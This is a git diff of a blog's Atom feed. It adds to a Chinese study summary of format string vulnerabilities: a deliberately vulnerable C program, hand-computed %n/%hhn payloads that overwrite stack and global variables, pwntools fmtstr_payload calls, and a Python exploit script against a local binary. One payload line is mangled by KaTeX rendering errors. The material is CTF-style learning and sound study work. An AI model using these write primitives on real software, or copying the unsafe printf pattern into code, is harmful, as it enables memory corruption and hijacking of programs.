@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://zhangzy999.github.io/</id>
     <title>Cyurl3_BLOG</title>
-    <updated>2020-06-06T09:42:29.831Z</updated>
+    <updated>2020-06-07T05:02:13.252Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://zhangzy999.github.io/"/>
     <link rel="self" href="https://zhangzy999.github.io/atom.xml"/>
@@ -11,12 +11,13 @@
     <icon>https://zhangzy999.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Cyurl3_BLOG</rights>
     <entry>
-        <title type="html"><![CDATA[格式化字符串漏洞学习总结(未完)]]></title>
-        <id>https://zhangzy999.github.io/post/ge-shi-hua-zi-fu-chuan-lou-dong-xue-xi-zong-jie-wei-wan/</id>
-        <link href="https://zhangzy999.github.io/post/ge-shi-hua-zi-fu-chuan-lou-dong-xue-xi-zong-jie-wei-wan/">
+        <title type="html"><![CDATA[格式化字符串漏洞学习总结]]></title>
+        <id>https://zhangzy999.github.io/post/format_string_study/</id>
+        <link href="https://zhangzy999.github.io/post/format_string_study/">
         </link>
         <updated>2020-06-06T09:16:23.000Z</updated>
-        <content type="html"><![CDATA[<p>从ctfwiki上学习了一波，来总结一下（推荐看ctfwiki，很详细，但是看完适合自己总结，第二遍看的时候就有些冗余了）</p>
+        <content type="html"><![CDATA[<p>从ctfwiki上学习了一波，来总结一下（推荐看ctfwiki，很详细，但是看完适合自己总结，第二遍看的时候就有些冗余了）<br>
+初学格式化字符串建议看wiki，本文是总结篇</p>
 <h1 id="泄露内存">泄露内存</h1>
 <h2 id="泄露栈内存">泄露栈内存</h2>
 <p>关于栈内存的泄露比较简单，不多说了</p>
@@ -65,6 +66,105 @@ sh.recvuntil('%4$s')
 print hex(u32(sh.recv()[4:8]))
 </code></pre>
 <p>然后就拿到了scanf的地址</p>
+<h1 id="覆盖内存">覆盖内存</h1>
+<h2 id="覆盖栈内存">覆盖栈内存</h2>
+<p>实例程序：</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+int a = 123, b = 456;
+int main() {
+  int c = 789;
+  char s[100];
+  printf(&quot;%p\n&quot;, &amp;c);
+  scanf(&quot;%s&quot;, s);
+  printf(s);
+  if (c == 16) {
+    puts(&quot;modified c.&quot;);
+  } else if (a == 2) {
+    puts(&quot;modified a for a small number.&quot;);
+  } else if (b == 0x12345678) {
+    puts(&quot;modified b for a big number!&quot;);
+  }
+  return 0;
+}
+</code></pre>
+<p>同样存在格式化字符串的漏洞，我们在这一小节来覆盖c的值，让他等于16<br>
+还是两步走：<br>
+第一步：确定c的地址（在程序中的第六行已经打印出来c的地址）<br>
+第二步：确定格式化字符串的参数（不再赘述，还是gdb中下断点或者直接运行程序数0x的个数，aaaa%p大法）<br>
+确定了这两步就能把payload写出来了<br>
+payload：p32([c_addr]) + (16-4) * 'A' + '%k$n'</p>
+<h2 id="覆盖任意地址内存">覆盖任意地址内存</h2>
+<h3 id="覆盖小值">覆盖小值</h3>
+<p>我们覆盖变量a<br>
+还是两步走：<br>
+第一步：确定a的地址，直接ida<br>
+第二部：确定格式化字符串的参数<br>
+注意，由于是小值（我们想要a的值是2），我们就不能把a的地址放到首位了，因为放到首位明显就占四字节，不可能让它再等于2了，所以我们往后移，同样的，格式化字符串参数也得后移<br>
+payload：2 * 'a' + '%K$n' + 2 * 'a'(为了占够4字节) + p32([a_addr])</p>
+<h3 id="覆盖大值">覆盖大值</h3>
+<p>我们覆盖变量b<br>
+还是两步走：<br>
+第一步：确定b的地址，直接ida<br>
+第二步：确定格式化参数<br>
+注意，我们的b是要变成0x12345678，输入那么多东西显然不太好，我们就采用一个字节一个字节的覆盖，就是b的地址覆盖0x78，然后b+1的地址处覆盖0x56，这种意思，有点儿像定位攻击一样<br>
+payload：p32([b_addr]) + p32([b_addr+1]) + ... + p32([b_addr+4]) +  104 * 'a' + '%6<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \̲*̲ &#039;a&#039; + &#039;%7'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%7</span>hhn' + 222 * 'a' + '%8<span class='katex-error' title='ParseError: KaTeX parse error: Undefined control sequence: \* at position 12: hhn&#039; + 222 \̲*̲ &#039;a&#039; + &#039;%9'>hhn&#039; + 222 \* &#039;a&#039; + &#039;%9</span>hhn'<br>
+（104 + 16(16是前面的四个地址加起来16字节) = 0x78，0x78 + 222 = 0x156，自动舍弃前面的1，即0x56，后面的计算方法同上，不再赘述）</p>
+<h2 id="pwntools中的宝藏函数">pwntools中的宝藏函数</h2>
+<pre><code> pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size='byte') → str[source]
+
+    Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from context.bits
+
+    The overflows argument is a format-string-length to output-amount tradeoff: Larger values for overflows produce shorter format strings that generate more output at runtime.
+    Parameters:	
+        offset (int) – the first formatter’s offset you control
+        writes (dict) – dict with addr, value {addr: value, addr2: value2}
+        numbwritten (int) – number of byte already written by the printf function
+        write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)
+        overflows (int) – how many extra overflows (at size sz) to tolerate to reduce the length of the format string
+        strategy (str) – either ‘fast’ or ‘small’ (‘small’ is default, ‘fast’ can be used if there are many writes)
+    
+    Returns:	The payload in order to do needed writes
+</code></pre>
+<p>所以之前的覆盖abc的payload就不用我们再算来算去了<br>
+直接调用这个超级无敌牛掰的函数<br>
+覆盖c：payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')<br>
+覆盖a：payload = fmtstr_payload(6,{a_addr:2},write_size='short')<br>
+覆盖b：payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')<br>
+其实对于第三个参数write_size，万能方法是让它等于'byte'，因为按字节来写入是最准确的，默认值也是byte，所以我们也可省略第三个参数<br>
+另外附上覆盖内存的exp（我用封装函数的形式来写）</p>
+<pre><code class="language-python">from pwn import *
+
+filename = './overflow'
+sh = process(filename)
+def stack():
+	c_addr = sh.recvuntil('\n',drop = True)
+	c_addr = int(c_addr,16)
+	#payload = p32(c_addr) + 12 * 'a' + '%6$n'
+	payload = fmtstr_payload(6,{c_addr:0x10},write_size='int')
+
+	sh.sendline(payload)
+	print sh.recv()
+
+def small():
+	a_addr = 0x0804A024
+	
+
+	#payload = 'aa' + '%8$n' + 'aa' + p32(a_addr)
+	payload = fmtstr_payload(6,{a_addr:2},write_size='short')	
+
+	sh.sendline(payload)
+	print sh.recv()
+
+def big():
+	b_addr = 0x0804A028
+	#payload = p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3)
+	#payload = payload + 104 * 'a' + '%6$hhn' + 222 * 'a' + '%7$hhn' + 222 * 'a' + '%8$hhn' + 222 * 'a' + '%9$hhn'
+	payload = fmtstr_payload(6,{0x0804A028:0x12345678},write_size='byte')
+	sh.sendline(payload)
+	print sh.recv()
+
+big()
+</code></pre>
 ]]></content>
     </entry>
     <entry>
